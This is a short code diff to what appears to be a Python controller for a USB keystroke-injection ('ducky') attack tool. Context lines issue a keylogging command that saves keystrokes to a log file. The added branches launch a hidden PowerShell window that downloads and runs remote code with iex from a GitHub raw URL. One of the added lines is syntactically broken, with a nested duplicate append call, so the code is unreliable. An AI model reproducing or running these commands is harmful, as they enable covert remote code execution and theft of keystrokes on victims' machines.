@@ -218,7 +218,14 @@ while not stop:
             else:
                 commands.append("get-keystrokes -logpath $env:userprofile\\Documents\\key.log")
             stdin = "; ".join(commands)
-
+        elif ducky_command[:8] == "capslock":
+            commands = []
+            commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/capslock).content\'")
+            stdin = "; ".join(commands)
+        elif ducky_command[:6] == "escape":
+            commands = []
+            commands.append("commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/capslock).content\'")
+            stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
             stdin = ""
